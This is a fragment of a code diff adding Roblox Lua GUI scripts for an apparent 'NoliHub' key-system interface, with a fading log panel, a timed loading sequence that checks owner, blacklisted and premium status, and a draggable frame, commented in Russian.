+			Icon = "rbxassetid://6031071050", -- Иконка для Info
+		},
+	}
+	
+	-- Функция для добавления логов
+	local function addLog(level, message)
+		local settings = logSettings[level]
+		if not settings then return end
+	
+		-- Создание фрейма для лога
+		local logFrame = Instance.new("Frame")
+		logFrame.Size = UDim2.new(1, 0, 0, 50) -- Размер фрейма для сообщения
+		logFrame.BackgroundTransparency = 1
+		logFrame.BorderSizePixel = 0
+		logFrame.LayoutOrder = #scrollingFrame:GetChildren() + 1
+		logFrame.Parent = scrollingFrame
+	
+		-- Цветная полоса слева
+		local colorBar = Instance.new("Frame")
+		colorBar.Size = UDim2.new(0, 10, 1, 0)
+		colorBar.BackgroundColor3 = settings.Color
+		colorBar.BorderSizePixel = 0
+		colorBar.Position = UDim2.new(0, 0, 0, 0)
+		colorBar.Parent = logFrame
+		colorBar.Transparency = 0.7
+	
+		-- Иконка
+		local icon = Instance.new("ImageLabel")
+		icon.Size = UDim2.new(0, 38, 0, 38)
+		icon.Position = UDim2.new(0, 10, 0, 6) -- Иконка немного вниз, чтобы выровнять
+		icon.Image = settings.Icon
+		icon.BackgroundTransparency = 1
+		icon.Parent = logFrame
+		icon.Transparency = 0.7
+	
+		-- Текст сообщения
+		local textLabel = Instance.new("TextLabel")
+		textLabel.Size = UDim2.new(1, -48, 1, 0) -- Учитываем размер иконки и цветной полосы
+		textLabel.Position = UDim2.new(0, 48, 0, 0) -- Текст справа от иконки
+		textLabel.Text = message
+		textLabel.TextColor3 = Color3.fromRGB(0, 0, 0) -- Черный цвет текста
+		textLabel.BackgroundTransparency = 1
+		textLabel.TextXAlignment = Enum.TextXAlignment.Left
+		textLabel.TextWrapped = true
+		textLabel.Parent = logFrame
+		textLabel.TextColor = BrickColor.new("White")
+		textLabel.TextTransparency = 0.7
+	
+		-- Обновление размера CanvasSize
+		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, scrollingFrame.UIListLayout.AbsoluteContentSize.Y)
+	
+		-- Автоматическая прокрутка до последнего сообщения
+		scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.CanvasSize.Y.Offset - scrollingFrame.AbsoluteSize.Y)
+	
+		-- Удаление старых сообщений через 30 секунд
+		delay(30, function()
+			logFrame:Destroy()
+			-- Обновление CanvasSize после удаления сообщения
+			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, scrollingFrame.UIListLayout.AbsoluteContentSize.Y)
+		end)
+	end
+	
+	-- Функция для очистки всех сообщений
+	local function clearLogs()
+		for _, child in ipairs(scrollingFrame:GetChildren()) do
+			if child:IsA("Frame") then
+				child:Destroy()
+			end
+		end
+		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0) -- Сброс размера CanvasSize
+	end
+	
+	-- Подписка на событие
+	LogEvent.Event:Connect(addLog)
+	
+	--whaa
+	LogEvent:Fire("Error", "Ключ система не активна")
+	wait(2)
+	LogEvent:Fire("Info", "Добро пожаловать!")
+	wait(2)
+	LogEvent:Fire("Info", "Загрузка закладок...")
+	wait(5)
+	LogEvent:Fire("Info", "Подписка на nolimanom...")
+	wait(2)
+	LogEvent:Fire("Info", "Обращение к UserList...")
+	if script.Parent.Parent.MainFrame.Screens.Home.Profile.PlayerName.Text == "nnolimanom" then
+		LogEvent:Fire("Info", "Добро пожаловать владелец!")
+	elseif script.Parent.Parent.MainFrame.Screens.Home.Profile.PlayerName.Text == "nnnolimanom" then
+		LogEvent:Fire("Error", "Получен ответ UserInBlacklist")
+		wait(3)
+		LogEvent:Fire("Warning", "Скрипт будет закрыт в течении семи секунд")
+		wait(7)
+		script.Parent.Parent:Destroy()
+	elseif script.Parent.Parent.Values.Premium.Value == true then
+	script.Parent.Parent.MainFrame.Screens.Home.Profile.Crown.Visible = true
+	script.Parent.Parent.MainFrame.Screens.Home.Profile.Premium.Visible = true
+	script.Parent.Parent.MainFrame.Screens.Home.Profile.User.Visible = false
+	elseif script.Parent.Parent.Values.Freemium.Value == true then
+	script.Parent.Parent.MainFrame.Screens.Home.Profile.Crown.Visible = false
+	script.Parent.Parent.MainFrame.Screens.Home.Profile.Premium.Visible = false
+	script.Parent.Parent.MainFrame.Screens.Home.Profile.User.Visible = true
+	end
+	wait(6)
+	LogEvent:Fire("Warning", "Загружено")
+	wait(2)
+	LogEvent:Fire("Error", "Вы используете альфа версию, сообщайте ошибки nolimanom-у")
+	wait(5)
+	LogEvent:Fire("Info", "Переход к главному экрану")
+	wait(1)
+	script.Parent.Parent.Loading.Visible = false
+	script.Parent.Parent.MainFrame.Visible = true
+	script.Parent.LoaderTexts.LocalScript.Enabled = false
+	wait(2)
+	script.Parent.Parent.MainFrame.Welcome.MoveThis.Value = true
+	
+end;
+task.spawn(C_109);
+-- StarterGui.NoliHub.KeySystem.Drag
+local function C_10a()
+local script = G2L["10a"];
+	local TweenService = game:GetService("TweenService")
+	local UserInputService = game:GetService("UserInputService")
+	
+	-- Функция для плавного перемещения фрейма
+	local function smoothMove(frame, targetPosition)
+		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+		local tween = TweenService:Create(frame, tweenInfo, {Position = targetPosition})
+		tween:Play()
+	end
+	
+	-- Функция для обработки начала перемещения
+	local function makeDraggable(frame)
+		local dragging = false
+		local dragStart
+		local startPos
+	
+		local function onInputBegan(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = frame.Position
+	
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+					end
+				end)
+			end
+		end
+	
+		local function onInputChanged(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - dragStart
+				local newPosition = UDim2.new(
+					startPos.X.Scale,
+					startPos.X.Offset + delta.X,
+					startPos.Y.Scale,
+					startPos.Y.Offset + delta.Y
+				)
+				smoothMove(frame, newPosition)
+			end
+		end
+	
+		frame.InputBegan:Connect(onInputBegan)
+		frame.InputChanged:Connect(onInputChanged)
+	end
+	
+	-- Пример использования
+	local frame = script.Parent -- Укажите ваш фрейм
+	makeDraggable(frame)
+	
+end;
+task.spawn(C_10a);
+
+return G2L["1"], require;
